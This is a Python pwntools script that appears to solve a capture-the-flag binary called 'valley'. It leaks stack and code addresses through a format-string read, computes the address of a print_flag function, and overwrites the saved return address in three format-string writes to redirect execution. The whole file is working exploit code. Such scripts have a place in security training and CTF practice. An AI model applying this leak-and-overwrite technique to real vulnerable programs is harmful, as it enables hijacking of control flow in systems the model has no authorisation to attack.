#!/usr/bin/env python3
from pwn import *


BIN_NAME = "valley"


def solve():

    context.arch = "amd64"
    context.log_level = "DEBUG"

    p = process(f"./{BIN_NAME}")

    p.sendlineafter(b"Shouting: ", b"%20$p::%21$p")
    p.recvuntil(b"You heard in the distance: ")

    addresses = p.recv().decode().strip().split("::")

    return_address = int(addresses[0], 16) - 8
    main_function_address = int(addresses[1], 16)
    print_flag_address = main_function_address - 0x1aa

    log.info(f"return address = {hex(return_address)}")
    log.info(f"main function address = {hex(main_function_address)}")
    log.info(f"print flag address = {hex(print_flag_address)}")

    chunks = [
            print_flag_address & 0xFFFF,
            (print_flag_address >> 16) & 0xFFFF,
            (print_flag_address >> 32) & 0xFFFF,
    ]

    log.info(f"sending the first {hex(chunks[0])} bytes")
    p.sendline(fmtstr_payload(6, {return_address: chunks[0]}))
    log.info(f"sending the second {hex(chunks[1])} bytes")
    p.sendline(fmtstr_payload(6, {return_address + 2: chunks[1]}))
    log.info(f"sending the third {hex(chunks[2])} bytes")
    p.sendline(fmtstr_payload(6, {return_address + 4: chunks[2]}))

    p.interactive()


def main():
    solve()

if __name__ == "__main__":
    main()
